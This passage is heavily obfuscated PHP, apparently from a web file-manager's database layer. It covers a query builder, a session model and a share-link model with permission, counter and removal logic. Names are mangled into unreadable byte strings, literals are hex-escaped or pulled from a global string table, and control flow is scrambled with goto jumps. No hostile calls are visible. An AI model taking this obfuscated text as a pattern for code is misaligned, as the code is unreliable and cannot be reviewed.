$fª¯¸ô½¨ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($fª¯¸ô½¨[33] === $cõ÷â´¼Íï) { if (isset($this->_scope[$fª¯¸ô½¨[34]])) { $dÍˆÖ©øà = $this->_scope[$fª¯¸ô½¨[34]]; } else { return $this; } } elseif (is_string($cõ÷â´¼Íï)) { $dß’Ùõƒ = explode($fª¯¸ô½¨[47], $cõ÷â´¼Íï); $dÍˆÖ©øà = array(); foreach ($dß’Ùõƒ as $e†¢¯å¶”Ó) { if (!isset($this->_scope[$e†¢¯å¶”Ó])) { continue; } $dÍˆÖ©øà = array_merge($dÍˆÖ©øà, $this->_scope[$e†¢¯å¶”Ó]); } if (!empty($dÑµŒ£Ö÷) && is_array($dÑµŒ£Ö÷)) { $dÍˆÖ©øà = array_merge($dÍˆÖ©øà, $dÑµŒ£Ö÷); } } elseif (is_array($cõ÷â´¼Íï)) { $dÍˆÖ©øà = $cõ÷â´¼Íï; } if (is_array($dÍˆÖ©øà) && !empty($dÍˆÖ©øà)) { $this->options = array_merge($this->options, array_change_key_case($dÍˆÖ©øà)); } return $this; } public function where($cî×ÊÊİÌ, $b‚†¹óÅ¹‡ = null) { $BÉ‘›‹åá =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_null($b‚†¹óÅ¹‡) && is_string($cî×ÊÊİÌ)) { if (!is_array($b‚†¹óÅ¹‡)) { $b‚†¹óÅ¹‡ = func_get_args(); array_shift($b‚†¹óÅ¹‡); } $b‚†¹óÅ¹‡ = array_map(array($this->db, $BÉ‘›‹åá[327]), $b‚†¹óÅ¹‡); $cî×ÊÊİÌ = vsprintf($cî×ÊÊİÌ, $b‚†¹óÅ¹‡); } elseif (is_object($cî×ÊÊİÌ)) { $cî×ÊÊİÌ = get_object_vars($cî×ÊÊİÌ); } elseif (is_array($cî×ÊÊİÌ)) { foreach ($cî×ÊÊİÌ as $eùàÖ“÷é± => $Aìõ‘’¡„) { if ((is_numeric($eùàÖ“÷é±) || !$eùàÖ“÷é±) && is_string($Aìõ‘’¡„)) { think_trace($BÉ‘›‹åá[334], $BÉ‘›‹åá[33], $BÉ‘›‹åá[46]); die; } } } if (is_string($cî×ÊÊİÌ) && $BÉ‘›‹åá[33] != $cî×ÊÊİÌ) { $b¯³‰ĞÀ³ = array(); $b¯³‰ĞÀ³[$BÉ‘›‹åá[335]] = $cî×ÊÊİÌ; $cî×ÊÊİÌ = $b¯³‰ĞÀ³; } if (isset($this->options[$BÉ‘›‹åá[259]])) { $this->options[$BÉ‘›‹åá[259]] = array_merge($this->options[$BÉ‘›‹åá[259]], $cî×ÊÊİÌ); } else { $this->options[$BÉ‘›‹åá[259]] = $cî×ÊÊİÌ; } return $this; } public function limit($E·ÎÁ¡ø¨œ, $bÑË¢Ñ„±† = null) { $b³Ú‚¿Ò… =& $_SERVER[Ö¹ñÒÁ²÷]; $this->options[$b³Ú‚¿Ò…[276]] = is_null($bÑË¢Ñ„±†) ? $E·ÎÁ¡ø¨œ : $E·ÎÁ¡ø¨œ . $b³Ú‚¿Ò…[47] . $bÑË¢Ñ„±†; return $this; } public function page($Dõ¹»ô‰ÒÕ, $A™å—Æ¶ƒç = null) { $D•ÆŠîÉÚ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->options[$D•ÆŠîÉÚ[336]] = is_null($A™å—Æ¶ƒç) ? $Dõ¹»ô‰ÒÕ : $Dõ¹»ô‰ÒÕ . $D•ÆŠîÉÚ[47] . $A™å—Æ¶ƒç; return $this; } public function comment($DÛ‡¦ö¾®) { $this->options[$_SERVER[Ö¹ñÒÁ²÷][337]] = $DÛ‡¦ö¾®; return $this; } public function setProperty($Dåôó¬‰Û, $e‘Õë™Åá) { if (property_exists($this, $Dåôó¬‰Û)) { $this->{$Dåôó¬‰Û} = $e‘Õë™Åá; } return $this; } } goto e‘ª‡šğöê; aÅÀËÀ”ËÑ: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\137\x73\x65\163\163\x69\x6f\156"; public function get($fâ°­Ó„Ó¶) { $F‡‚™âÍ‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÒâ•Âƒ‹ = $this->where(array($F‡‚™âÍ‘[2181] => $fâ°­Ó„Ó¶))->find(); if (!is_array($cÒâ•Âƒ‹)) { return !1; } return $cÒâ•Âƒ‹[$F‡‚™âÍ‘[689]]; } public function set($cîÃŞ£šÚ, $BÓë¾ˆ¥‡”, $BŠÙ°Öœğ = 3600) { $a¦ÂœêˆŠë =& $_SERVER[Ö¹ñÒÁ²÷]; $fŸáÆ“Å¬ˆ = array($a¦ÂœêˆŠë[2181] => $cîÃŞ£šÚ, $a¦ÂœêˆŠë[2110] => $BÓë¾ˆ¥‡”, $a¦ÂœêˆŠë[2182] => $BŠÙ°Öœğ + time()); if (Session::get($a¦ÂœêˆŠë[2183])) { $fŸáÆ“Å¬ˆ[$a¦ÂœêˆŠë[1415]] = Session::get($a¦ÂœêˆŠë[2183]); } else { $fŸáÆ“Å¬ˆ[$a¦ÂœêˆŠë[1415]] = 0; } if ($this->get($cîÃŞ£šÚ)) { return $this->where(array($a¦ÂœêˆŠë[2181] => $cîÃŞ£šÚ))->save($fŸáÆ“Å¬ˆ); } else { return $this->add($fŸáÆ“Å¬ˆ, array(), !0); } } public function remove($AÅÎˆøÈÙ±) { return $this->where(array($_SERVER[Ö¹ñÒÁ²÷][2181] => $AÅÎˆøÈÙ±))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ö¹ñÒÁ²÷][2184] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\164\x2c\x75\160\144\x61\164\x65", "\146\165\156\x63\x74\151\157\156"), array("\x63\162\145\x61\x74\145\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\145\x72\x74", "\146\x75\156\143\164\x69\157\156"), array("\x6f\160\x74\x69\x6f\156\x73", '', "\x69\156\x73\x65\x72\x74\54\x75\160\x64\x61\164\145\x2c\x73\x65\154\145\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($bß‘‰öª°Û) { $b÷½±å˜¯« =& $_SERVER[Ö¹ñÒÁ²÷]; $C®©§ÙŠß = isset($bß‘‰öª°Û[0]) ? $bß‘‰öª°Û[0] : !1; return array($b÷½±å˜¯«[2185] => array(USER_ID, $b÷½±å˜¯«[2186]), $b÷½±å˜¯«[2148] => array($C®©§ÙŠß, $b÷½±å˜¯«[2187])); } protected function listSimple() { $F±•îÇÑóö = array($_SERVER[Ö¹ñÒÁ²÷][1415] => USER_ID); $cé´Â„Û‡ = $this->field($this->fieldList)->where($F±•îÇÑóö)->select(); return $cé´Â„Û‡ ? $cé´Â„Û‡ : array(); } protected function getInfo($b„Öí‚å•©, $F¬àÆ§Ä¾ = false) { $cÄ÷Ä­‚¸É =& $_SERVER[Ö¹ñÒÁ²÷]; if ($F¬àÆ§Ä¾) { return $this->_getShareInfo(array($cÄ÷Ä­‚¸É[437] => $b„Öí‚å•©)); } $F•ƒÊ¸¤ƒ¶ = $this->cacheFunctionGet($cÄ÷Ä­‚¸É[2188], $b„Öí‚å•©); return $F•ƒÊ¸¤ƒ¶; } public function getInfoByHash($C¯‹¤Ùê«£) { return $this->_getShareInfo(array($_SERVER[Ö¹ñÒÁ²÷][439] => $C¯‹¤Ùê«£)); } public function getInfoByPath($BÌ«ä˜óŞ) { $e†ËÔÍŞë› =& $_SERVER[Ö¹ñÒÁ²÷]; $Fô¸™Û‹ô¨ = array($e†ËÔÍŞë›[1415] => USER_ID, $e†ËÔÍŞë›[365] => $BÌ«ä˜óŞ); return $this->_getShareInfo($Fô¸™Û‹ô¨); } public function getInfoBySourcePath($f—åÉ¶Û) { $b¸Û¨¼×‘È =& $_SERVER[Ö¹ñÒÁ²÷]; $d‹×ˆ¥Ë› = array($b¸Û¨¼×‘È[1415] => USER_ID, $b¸Û¨¼×‘È[1012] => $f—åÉ¶Û); return $this->_getShareInfo($d‹×ˆ¥Ë›); } private function _getShareInfo($C˜‡æ´Ì˜¶) { goto fÃÇ×‚ñ¤; E¸…ô‹‹‚¨: $C˜‡æ´Ì˜¶ = array($eÏï¿¿µ¦[437] => $eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[437]]); $CÌ¤Ìàƒ = $eÏï¿¿µ¦[2189]; $däîÄ¼´ì¾ = Model($eÏï¿¿µ¦[533])->order($eÏï¿¿µ¦[363])->field($CÌ¤Ìàƒ)->where($C˜‡æ´Ì˜¶)->select(); goto bØŒ…Ğ­¾; bØŒ…Ğ­¾: if ($eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[365]] == $eÏï¿¿µ¦[464]) { $eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[387]] = IO::info($eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[1012]]); } else { $eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[387]] = Model($eÏï¿¿µ¦[1104])->pathInfo($eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[365]]); } $eâåÁ’ÉÂÂ[$eÏï¿¿µ¦[2190]] = $däîÄ¼´ì¾; return $eâåÁ’ÉÂÂ; goto D“¦ß¸Â¹Ë; fÃÇ×‚ñ¤: $eÏï¿¿µ¦ =& $_SERVER[Ö¹ñÒÁ²÷]; $eâåÁ’ÉÂÂ = $this->where($C˜‡æ´Ì˜¶)->find(); if (!$eâåÁ’ÉÂÂ) { return !1; } goto E¸…ô‹‹‚¨; D“¦ß¸Â¹Ë: } protected function getInfoAuth($d§°§ë“¡ø) { $bÍ ¶ğËò =& $_SERVER[Ö¹ñÒÁ²÷]; $cßÆé¤¢ëÚ = $this->getInfo($d§°§ë“¡ø); $cßÆé¤¢ëÚ[$bÍ ¶ğËò[372]] = Model($bÍ ¶ğËò[450])->authMake($cßÆé¤¢ëÚ[$bÍ ¶ğËò[2190]]); return $cßÆé¤¢ëÚ; } protected function listData($c˜ÕõæßÒ¾ = null, $DùîÌÚ³ö = 300) { $F‘˜½ôÙíï =& $_SERVER[Ö¹ñÒÁ²÷]; $D ¾æˆ„ß¼ = array(array($F‘˜½ôÙíï[442] => array($F‘˜½ôÙíï[922], 0), $F‘˜½ôÙíï[444] => array($F‘˜½ôÙíï[922], 0), $F‘˜½ôÙíï[2191] => $F‘˜½ôÙíï[2160])); if ($c˜ÕõæßÒ¾ == $F‘˜½ôÙíï[1846]) { $D ¾æˆ„ß¼ = array($F‘˜½ôÙíï[442] => 1); } else { if ($c˜ÕõæßÒ¾ == $F‘˜½ôÙíï[1001]) { $D ¾æˆ„ß¼ = array($F‘˜½ôÙíï[444] => 1); } } $D ¾æˆ„ß¼[$F‘˜½ôÙíï[1415]] = USER_ID; $C™‘èÀÛ‹æ = $this->where($D ¾æˆ„ß¼)->selectPage($DùîÌÚ³ö); return $C™‘èÀÛ‹æ; } protected function listToMe($bÀÚÁãÒ… = 300) { goto b‘ÈøË¶§; e¦¼½…ã³: $A•£á†£†Ÿ = array_to_keyvalue_group($DÍéÀàèğÊ[$d¦‘‡¼¸¼[350]], $d¦‘‡¼¸¼[437]); if (!$A•£á†£†Ÿ) { return $DÍéÀàèğÊ; } $AöæãŠ‘Õ = $d¦‘‡¼¸¼[2193]; goto FÀäÊ²°ÉÒ; bÈ ÆÎÙ‡: $a¡’Ë®Ô‘Ñ = array($d¦‘‡¼¸¼[517] => SourceModel::TYPE_USER, $d¦‘‡¼¸¼[452] => USER_ID); if ($F’É‹¦…ã) { $a¡’Ë®Ô‘Ñ = array(array($d¦‘‡¼¸¼[517] => SourceModel::TYPE_USER, $d¦‘‡¼¸¼[452] => USER_ID), array($d¦‘‡¼¸¼[517] => SourceModel::TYPE_GROUP, $d¦‘‡¼¸¼[452] => array($d¦‘‡¼¸¼[7], $F’É‹¦…ã)), $d¦‘‡¼¸¼[2191] => $d¦‘‡¼¸¼[2160]); } $DÍéÀàèğÊ = Model($d¦‘‡¼¸¼[533])->where($a¡’Ë®Ô‘Ñ)->selectPage($bÀÚÁãÒ…); goto e¦¼½…ã³; b«¡”Š¿Æ: $bœîÄÆŠ = array($d¦‘‡¼¸¼[2194] => $a—Íå‚ëÆ¹, $d¦‘‡¼¸¼[2195] => $DÍéÀàèğÊ[$d¦‘‡¼¸¼[347]]); return $bœîÄÆŠ; goto d‹¥³ˆ÷©î; b‘ÈøË¶§: $d¦‘‡¼¸¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $B‡ÌŠêğŠİ = Session::get($d¦‘‡¼¸¼[2192]); $F’É‹¦…ã = array_to_keyvalue($B‡ÌŠêğŠİ, $d¦‘‡¼¸¼[33], $d¦‘‡¼¸¼[2079]); goto bÈ ÆÎÙ‡; FÀäÊ²°ÉÒ: $a¡’Ë®Ô‘Ñ = array($d¦‘‡¼¸¼[437] => array($d¦‘‡¼¸¼[380], array_keys($A•£á†£†Ÿ))); $a—Íå‚ëÆ¹ = $this->field($AöæãŠ‘Õ)->where($a¡’Ë®Ô‘Ñ)->select(); foreach ($a—Íå‚ëÆ¹ as $F°¡ËºçòÇ => &$f ÇòŒåÓª) { $f ÇòŒåÓª[$d¦‘‡¼¸¼[2190]] = $A•£á†£†Ÿ[$f ÇòŒåÓª[$d¦‘‡¼¸¼[437]]]; } goto b«¡”Š¿Æ; d‹¥³ˆ÷©î: } protected function shareAdd($bÚ†¯æŒğ, $fÇÁ¾ç¨ŠÆ) { $FŒÄÇÌ°¾ª =& $_SERVER[Ö¹ñÒÁ²÷]; $FŞàÏå¹Ü = $this->_addShareData($bÚ†¯æŒğ, $fÇÁ¾ç¨ŠÆ); if (!empty($fÇÁ¾ç¨ŠÆ[$FŒÄÇÌ°¾ª[2196]])) { $this->_shareAuthSet($FŞàÏå¹Ü, $fÇÁ¾ç¨ŠÆ[$FŒÄÇÌ°¾ª[2196]]); } $this->shareEventAdd($bÚ†¯æŒğ, $fÇÁ¾ç¨ŠÆ, $FŒÄÇÌ°¾ª[1004]); return $FŞàÏå¹Ü; } private function shareEventAdd($e…´¨ÊÛ, $bØµã†…Â, $bµßÎ„Ğ”× = "\141\144\x64") { goto aÕåÀí‘†å; Aùà©ø”æò: $bØÕÂ‘§œœ = $fˆØª¸ÖÜ™[2199]; if ($AàÏ¦ÄÆŒ°[$fˆØª¸ÖÜ™[442]] == $fˆØª¸ÖÜ™[464] && $bØµã†…Â[$fˆØª¸ÖÜ™[442]] == $fˆØª¸ÖÜ™[83]) { $bØÕÂ‘§œœ = $fˆØª¸ÖÜ™[2197]; } if ($AàÏ¦ÄÆŒ°[$fˆØª¸ÖÜ™[442]] == $fˆØª¸ÖÜ™[83] && $bØµã†…Â[$fˆØª¸ÖÜ™[442]] == $fˆØª¸ÖÜ™[464]) { $bØÕÂ‘§œœ = $fˆØª¸ÖÜ™[2200]; } goto EàôéØĞ¤’; aÕåÀí‘†å: $fˆØª¸ÖÜ™ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($bµßÎ„Ğ”× == $fˆØª¸ÖÜ™[1004]) { if ($bØµã†…Â[$fˆØª¸ÖÜ™[442]] == $fˆØª¸ÖÜ™[83]) { Model($fˆØª¸ÖÜ™[501])->eventShare($e…´¨ÊÛ, $fˆØª¸ÖÜ™[2197]); } if ($bØµã†…Â[$fˆØª¸ÖÜ™[444]] == $fˆØª¸ÖÜ™[83]) { Model($fˆØª¸ÖÜ™[501])->eventShare($e…´¨ÊÛ, $fˆØª¸ÖÜ™[2198]); } return; } $AàÏ¦ÄÆŒ° = $this->getInfoByPath($e…´¨ÊÛ); goto Aùà©ø”æò; FÖ±¯¸›‘¹: return; goto a‚å¾Ëì¥¬; EàôéØĞ¤’: if ($AàÏ¦ÄÆŒ°[$fˆØª¸ÖÜ™[444]] == $fˆØª¸ÖÜ™[464] && $bØµã†…Â[$fˆØª¸ÖÜ™[444]] == $fˆØª¸ÖÜ™[83]) { $bØÕÂ‘§œœ = $fˆØª¸ÖÜ™[2198]; } if ($AàÏ¦ÄÆŒ°[$fˆØª¸ÖÜ™[444]] == $fˆØª¸ÖÜ™[83] && $bØµã†…Â[$fˆØª¸ÖÜ™[444]] == $fˆØª¸ÖÜ™[464]) { $bØÕÂ‘§œœ = $fˆØª¸ÖÜ™[2201]; } Model($fˆØª¸ÖÜ™[501])->eventShare($e…´¨ÊÛ, $bØÕÂ‘§œœ); goto FÖ±¯¸›‘¹; a‚å¾Ëì¥¬: } private function _addShareData($EàÎ’Ú¥òÍ, $CØ÷··ÎÎ– = array()) { goto eéÌ…¢›÷; bçÃ›â†¶Î: return $aÇ¥×ßŠõ‘; goto e¾Ú¡êºÎÇ; eéÌ…¢›÷: $b³´÷¾‡§ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÀøÏå‘÷ = array($b³´÷¾‡§[379] => $EàÎ’Ú¥òÍ, $b³´÷¾‡§[1406] => USER_ID); if ($EàÎ’Ú¥òÍ == 0) { $cÀøÏå‘÷ = array($b³´÷¾‡§[2202] => $CØ÷··ÎÎ–[$b³´÷¾‡§[1012]], $b³´÷¾‡§[1406] => USER_ID); } goto bŸËÑÍğğ÷; FĞø¼ç¯: $cÛÜİÀâÄÉ = array($b³´÷¾‡§[1406] => USER_ID, $b³´÷¾‡§[379] => $EàÎ’Ú¥òÍ, $b³´÷¾‡§[1323] => $b³´÷¾‡§[33], $b³´÷¾‡§[442] => 0, $b³´÷¾‡§[444] => 0, $b³´÷¾‡§[1012] => $b³´÷¾‡§[33], $b³´÷¾‡§[291] => $b³´÷¾‡§[33], $b³´÷¾‡§[798] => $b³´÷¾‡§[33], $b³´÷¾‡§[2203] => 0, $b³´÷¾‡§[2204] => 0, $b³´÷¾‡§[700] => 0, $b³´÷¾‡§[2205] => $b³´÷¾‡§[33], $b³´÷¾‡§[439] => $b³´÷¾‡§[33]); $bôÏ¼¦Ó¦ = explode($b³´÷¾‡§[47], $b³´÷¾‡§[2206]); foreach ($bôÏ¼¦Ó¦ as $BÏ…–Ã… ƒ) { if (!isset($CØ÷··ÎÎ–[$BÏ…–Ã… ƒ])) { continue; } $cÛÜİÀâÄÉ[$BÏ…–Ã… ƒ] = $CØ÷··ÎÎ–[$BÏ…–Ã… ƒ]; } goto DçŸ…£Ó˜İ; DçŸ…£Ó˜İ: $aÇ¥×ßŠõ‘ = $this->add($cÛÜİÀâÄÉ); $A’˜Œİƒ³ò = array($b³´÷¾‡§[439] => short_id($aÇ¥×ßŠõ‘)); $this->where(array($b³´÷¾‡§[436] => $aÇ¥×ßŠõ‘))->save($A’˜Œİƒ³ò); goto bçÃ›â†¶Î; bŸËÑÍğğ÷: if ($CÛì˜ƒ×ë¢ = $this->where($cÀøÏå‘÷)->find()) { return $CÛì˜ƒ×ë¢[$b³´÷¾‡§[437]]; } if ($EàÎ’Ú¥òÍ == 0) { $AŸ²È“Í¾ = array($b³´÷¾‡§[28] => get_path_this($CØ÷··ÎÎ–[$b³´÷¾‡§[75]])); } else { $AŸ²È“Í¾ = Model($b³´÷¾‡§[749])->sourceInfo($EàÎ’Ú¥òÍ); if (!$AŸ²È“Í¾) { return !1; } } if (!$CØ÷··ÎÎ–[$b³´÷¾‡§[1323]]) { $CØ÷··ÎÎ–[$b³´÷¾‡§[1323]] = $AŸ²È“Í¾[$b³´÷¾‡§[28]]; } goto FĞø¼ç¯; e¾Ú¡êºÎÇ: } private function _shareAuthSet($Fáµ±’Ç“§, $c„ù…ìÉ) { goto aîÓ—·åİ; C´Õ‰¨»ÅŸ: return $c×ñ†í»’„->addAll($a¶†Æé«´‰, array(), !0); goto DâÇÓ¾âĞ—; aîÓ—·åİ: $b½«ì“ˆô‹ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_array($c„ù…ìÉ)) { return !1; } $c×ñ†í»’„ = Model($b½«ì“ˆô‹[2207]); goto bÌ£Êö”è±; bÌ£Êö”è±: $c×ñ†í»’„->where(array($b½«ì“ˆô‹[437] => $Fáµ±’Ç“§))->delete(); $a¶†Æé«´‰ = array(); foreach ($c„ù…ìÉ as $açïÁÓ±¤) { $e½²¨éâÃÌ = SourceModel::TYPE_USER; if ($açïÁÓ±¤[$b½«ì“ˆô‹[367]] == SourceModel::TYPE_GROUP) { $e½²¨éâÃÌ = SourceModel::TYPE_GROUP; } $D¥©˜é†èÍ = array($b½«ì“ˆô‹[437] => $Fáµ±’Ç“§, $b½«ì“ˆô‹[367] => $e½²¨éâÃÌ, $b½«ì“ˆô‹[452] => intval($açïÁÓ±¤[$b½«ì“ˆô‹[452]]), $b½«ì“ˆô‹[2208] => 0, $b½«ì“ˆô‹[2209] => -1); if ($açïÁÓ±¤[$b½«ì“ˆô‹[2208]]) { $D¥©˜é†èÍ[$b½«ì“ˆô‹[2208]] = $açïÁÓ±¤[$b½«ì“ˆô‹[2208]]; } else { if ($açïÁÓ±¤[$b½«ì“ˆô‹[2209]]) { $D¥©˜é†èÍ[$b½«ì“ˆô‹[2209]] = $açïÁÓ±¤[$b½«ì“ˆô‹[2209]]; } } $a¶†Æé«´‰[] = $D¥©˜é†èÍ; } goto C´Õ‰¨»ÅŸ; DâÇÓ¾âĞ—: } public function numViewAdd($EÎ°ÉË÷ì) { $dìõ×¾“­´ =& $_SERVER[Ö¹ñÒÁ²÷]; $B¼ÛÏ‚âšœ = array($dìõ×¾“­´[436] => $EÎ°ÉË÷ì); $this->where($B¼ÛÏ‚âšœ)->setAdd($dìõ×¾“­´[2203]); } public function numDownloadAdd($c÷Å„†Ÿ­) { $a‚óî¥İ»Ó =& $_SERVER[Ö¹ñÒÁ²÷]; $E–¬ÕÄ¦÷è = array($a‚óî¥İ»Ó[436] => $c÷Å„†Ÿ­); $this->where($E–¬ÕÄ¦÷è)->setAdd($a‚óî¥İ»Ó[2204]); } protected function shareEdit($cˆíó¼‚Šâ, $D”Ì•…¼Ó”) { goto bïˆ©˜ó’Š; EšÀÑ³Á“Ã: $this->_checkLinkShare($D”Ì•…¼Ó”, $F›¸Öğ¾é×); $aæ…½îà½Ô = array(); $c™¸¸î“ÑŒ = explode($eÔÌ£¹²º[47], $eÔÌ£¹²º[2210]); goto Fæ‘šâËÎ; A¨İ¹‰®â…: if (isset($D”Ì•…¼Ó”[$eÔÌ£¹²º[2196]])) { $this->_shareAuthSet($cˆíó¼‚Šâ, $D”Ì•…¼Ó”[$eÔÌ£¹²º[2196]]); } return !0; goto D¨é˜Ö‚ÍÃ; Fæ‘šâËÎ: foreach ($c™¸¸î“ÑŒ as $b Ë‹·ñ˜†) { if (!array_key_exists($b Ë‹·ñ˜†, $D”Ì•…¼Ó”)) { continue; } $aæ…½îà½Ô[$b Ë‹·ñ˜†] = $D”Ì•…¼Ó”[$b Ë‹·ñ˜†]; } $this->shareEventAdd($F›¸Öğ¾é×[$eÔÌ£¹²º[365]], $D”Ì•…¼Ó”, $eÔÌ£¹²º[2047]); $this->where(array($eÔÌ£¹²º[436] => $cˆíó¼‚Šâ))->save($aæ…½îà½Ô); goto A¨İ¹‰®â…; bïˆ©˜ó’Š: $eÔÌ£¹²º =& $_SERVER[Ö¹ñÒÁ²÷]; $F›¸Öğ¾é× = $this->getInfo($cˆíó¼‚Šâ); if (!$F›¸Öğ¾é×) { return !1; } goto EšÀÑ³Á“Ã; D¨é˜Ö‚ÍÃ: } private function _checkLinkShare($bÙÏºù·Õ½, $EÒÃÙò˜½) { goto eİ‹“­¹Ü; eİ‹“­¹Ü: $Fƒã«¡º´­ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($bÙÏºù·Õ½[$Fƒã«¡º´­[442]] != $Fƒã«¡º´­[83]) { return; } $dà§ãºƒÁ = $EÒÃÙò˜½[$Fƒã«¡º´­[387]][$Fƒã«¡º´­[365]]; goto A÷Š“Õ†´Õ; A÷Š“Õ†´Õ: if ($EÒÃÙò˜½[$Fƒã«¡º´­[387]][$Fƒã«¡º´­[29]] != $Fƒã«¡º´­[163]) { $bÀ¾¾­ï•ó = $this->_folderReport($dà§ãºƒÁ); if (!$bÀ¾¾­ï•ó) { return; } show_json(LNG($Fƒã«¡º´­[2211]) . $Fƒã«¡º´­[2212] . $bÀ¾¾­ï•ó, !1); } $a¼ÍÖ ‹ŠÈ = Model($Fƒã«¡º´­[749])->fileInfoGet($EÒÃÙò˜½[$Fƒã«¡º´­[387]][$Fƒã«¡º´­[365]]); if (!$a¼ÍÖ ‹ŠÈ) { return; } goto FÚ¦»óèî; FÚ¦»óèî: $Dõ„†ôæ³ = $this->shareFileMeta($a¼ÍÖ ‹ŠÈ[$Fƒã«¡º´­[415]]); if (isset($Dõ„†ôæ³[$Fƒã«¡º´­[355]]) && $Dõ„†ôæ³[$Fƒã«¡º´­[355]] == $Fƒã«¡º´­[83]) { show_json(LNG($Fƒã«¡º´­[2213]), !1); } goto a‰Œ©•¸; a‰Œ©•¸: } private function _folderReport($Eœâ’¡ˆÄ) { goto b¤–¢¡Ößµ; dÖÈ¬Ô¦¤Û: $cŠ«İ†¶•Ô = substr($Bôğ±÷›à[$F×áÍƒÈ˜[455]], strpos($Bôğ±÷›à[$F×áÍƒÈ˜[455]], $c¹·ƒ¼³¯ )); $a§Í”íã•˜ = array($F×áÍƒÈ˜[365] => array($F×áÍƒÈ˜[7], trim($cŠ«İ†¶•Ô, $F×áÍƒÈ˜[47]))); $e‰ëÎÊÎ‘ï = Model($F×áÍƒÈ˜[749])->where($a§Í”íã•˜)->field($F×áÍƒÈ˜[28])->select(); goto DÀåÙæÜ’§; b¤–¢¡Ößµ: $F×áÍƒÈ˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $a§Í”íã•˜ = array($F×áÍƒÈ˜[415] => array($F×áÍƒÈ˜[922], 0), $F×áÍƒÈ˜[686] => 3); $Fª”ÄŠÏÄ® = Model($F×áÍƒÈ˜[2214])->where($a§Í”íã•˜)->field($F×áÍƒÈ˜[415])->select(); goto AñÎÃµƒÉ”; AñÎÃµƒÉ”: if (!$Fª”ÄŠÏÄ®) { return !1; } $Fª”ÄŠÏÄ® = array_to_keyvalue($Fª”ÄŠÏÄ®, $F×áÍƒÈ˜[33], $F×áÍƒÈ˜[415]); $c¹·ƒ¼³¯  = $F×áÍƒÈ˜[47] . $Eœâ’¡ˆÄ . $F×áÍƒÈ˜[47]; goto f±´Í ÊÄ; DÀåÙæÜ’§: $bİçİ÷§¡ = array_to_keyvalue($e‰ëÎÊÎ‘ï, $F×áÍƒÈ˜[33], $F×áÍƒÈ˜[28]); $bİçİ÷§¡[] = $Bôğ±÷›à[$F×áÍƒÈ˜[28]]; return implode($F×áÍƒÈ˜[8], $bİçİ÷§¡); goto AÒØ¢‡˜Ÿ°; f±´Í ÊÄ: $a§Í”íã•˜ = array($F×áÍƒÈ˜[415] => array($F×áÍƒÈ˜[7], $Fª”ÄŠÏÄ®), $F×áÍƒÈ˜[455] => array($F×áÍƒÈ˜[748], "\45{$c¹·ƒ¼³¯ }\45"), $F×áÍƒÈ˜[393] => 0); $Bôğ±÷›à = Model($F×áÍƒÈ˜[749])->where($a§Í”íã•˜)->field($F×áÍƒÈ˜[2215])->find(); if (!$Bôğ±÷›à) { return !1; } goto dÖÈ¬Ô¦¤Û; AÒØ¢‡˜Ÿ°: } protected function remove($d¬Ê·ë¨ìè) { goto b©¿¿„â; e¶İ‹¬Ôô: $bÎÛÇÇ˜‡¡ = $this->where($AÌ¸¡ë¢¹Å)->delete(); if ($bÎÛÇÇ˜‡¡) { Model($E¯š¡ß ÔŒ[533])->where(array($E¯š¡ß ÔŒ[437] => $d¬Ê·ë¨ìè))->delete(); } $Dˆ¬Ì»Ø°’ = is_array($d¬Ê·ë¨ìè) ? $d¬Ê·ë¨ìè[1] : array($d¬Ê·ë¨ìè); goto E®ù”ƒ‘éµ; b©¿¿„â: $E¯š¡ß ÔŒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($d¬Ê·ë¨ìè)) { $d¬Ê·ë¨ìè = array($E¯š¡ß ÔŒ[7], $d¬Ê·ë¨ìè); } $AÌ¸¡ë¢¹Å = array($E¯š¡ß ÔŒ[437] => $d¬Ê·ë¨ìè); goto e¶İ‹¬Ôô; E®ù”ƒ‘éµ: for ($eèÏ˜–ÈÛ† = 0; $eèÏ˜–ÈÛ† < count($Dˆ¬Ì»Ø°’); $eèÏ˜–ÈÛ†++) { $D¡ø÷¡¯ğ = $this->getInfo($Dˆ¬Ì»Ø°’[$eèÏ˜–ÈÛ†]); if ($D¡ø÷¡¯ğ[$E¯š¡ß ÔŒ[444]] == $E¯š¡ß ÔŒ[83]) { Model($E¯š¡ß ÔŒ[501])->eventShare($D¡ø÷¡¯ğ[$E¯š¡ß ÔŒ[365]], $E¯š¡ß ÔŒ[2201]); } if ($D¡ø÷¡¯ğ[$E¯š¡ß ÔŒ[442]] == $E¯š¡ß ÔŒ[83]) { Model($E¯š¡ß ÔŒ[501])->eventShare($D¡ø÷¡¯ğ[$E¯š¡ß ÔŒ[365]], $E¯š¡ß ÔŒ[2200]); } } return $bÎÛÇÇ˜‡¡; goto Fëæ†âÏ¢¿; Fëæ†âÏ¢¿: } protected function removeBySource($EˆÙ³„¯Ã”) { goto A¶ÃÈì»Ğõ; Fïµ¤à¶Òˆ: $this->where($fªÉ·š²æ)->delete(); Model($b¢â¥‡÷ñ[533])->where($fªÉ·š²æ)->delete(); goto FÂ½±Ô£Õœ; C•£–¡‰Ûæ: $C¶–¦ÒÊÆ = array_to_keyvalue($C¶–¦ÒÊÆ, $b¢â¥‡÷ñ[33], $b¢â¥‡÷ñ[437]); if (!$C¶–¦ÒÊÆ) { return; } $fªÉ·š²æ = 